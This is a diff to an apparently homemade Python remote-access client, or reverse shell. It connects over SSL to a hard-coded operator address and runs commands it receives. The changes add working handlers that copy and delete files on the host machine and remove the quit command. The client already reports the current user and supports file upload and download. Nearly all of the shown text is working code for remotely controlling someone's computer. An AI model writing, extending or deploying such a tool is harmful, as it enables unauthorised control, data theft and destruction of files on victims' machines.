@@ -11,6 +11,7 @@ import socket
 import ssl
 import subprocess
 import os
+import shutil
 
 # /!\ MODIFIER @ HOST AVANT D'EXECUTER LE PROGRAMME
 HOST = '192.168.1.6'
@@ -48,9 +49,17 @@ try:
             output = os.getcwd()
             wrappedSocket.sendall(output.encode()) 
         elif cmd[0] == "cp":
-            wrappedSocket.sendall(cmd[0].encode())
+            shutil.copy2(cmd[1], cmd[2])
+            output = f"{cmd[2]} has been created!"
+            wrappedSocket.sendall(output.encode())
         elif cmd[0] == "rm":
-            wrappedSocket.sendall(cmd[0].encode())
+            if os.path.exists(cmd[1]):
+                os.remove(cmd[1])
+                output = f"{cmd[1]} removed!"
+                wrappedSocket.sendall(output.encode())
+            else:
+                output = f"{cmd[1]} does not exist"
+                wrappedSocket.sendall(output.encode())
         elif cmd[0] == "who":
             output = os.environ.get('USERNAME')
             wrappedSocket.sendall(output.encode())
@@ -75,10 +84,6 @@ try:
             send(cmd)
         elif cmd[0] == "upload":
             send(cmd)
-        elif cmd[0] == "q" or cmd[0] == "quit" or cmd[0] == "exit":
-            wrappedSocket.shutdown(socket.SHUT_RDWR)
-            wrappedSocket.close()
-            exit(0)
         """
 except Exception:
     exit(-1)
